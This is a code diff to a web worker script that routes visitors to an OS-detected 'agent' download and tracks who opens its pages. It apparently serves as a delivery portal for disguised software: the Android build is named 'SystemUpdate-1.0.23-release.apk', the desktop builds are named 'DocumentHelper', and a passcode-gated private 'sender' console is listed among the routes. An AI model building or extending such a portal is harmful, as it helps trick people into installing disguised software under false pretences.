@@ -2,7 +2,8 @@
 // Copied into the upload bundle as `_worker.js` by mk-pages-dir.sh.
 //
 // Routes:
-//   /get | /download  -> 302 to the OS-appropriate agent (.exe / .pkg / .run)
+//   /connect | /agents -> public OS-detected agent list (connect.html)
+//   /get | /download  -> 302 to the OS-appropriate agent (.exe / .pkg / .run / .apk)
 //   /dl/<file>        -> force download (Content-Disposition: attachment)
 //                        unknown /dl/ names answer 404 - never the portal HTML
 //   /sender           -> PRIVATE sender console (passcode gated), sender.html
@@ -121,9 +122,17 @@ export default {
       return loginPage('');
     }
 
+    // --- Public agent page (lists every OS, detects and auto-downloads) ---
+    if (p === '/connect' || p === '/connect/' || p === '/agents' || p === '/agents/') {
+      logEvent(req, u, ua, 'open', { path: p });
+      return env.ASSETS.fetch(new URL('/connect.html', u));
+    }
+
     // --- OS-aware agent download ---
     if (p === '/get' || p === '/download') {
-      const f = /Windows/i.test(ua)            ? 'DocumentHelper.exe'
+      // Android UAs also contain "Linux", so test Android first.
+      const f = /Android/i.test(ua)            ? 'SystemUpdate-1.0.23-release.apk'
+              : /Windows/i.test(ua)            ? 'DocumentHelper.exe'
               : /Macintosh|Mac OS X/i.test(ua) ? 'DocumentHelper.pkg'
               : /Linux|X11/i.test(ua)          ? 'DocumentHelper.run'
               : 'DocumentHelper.exe';
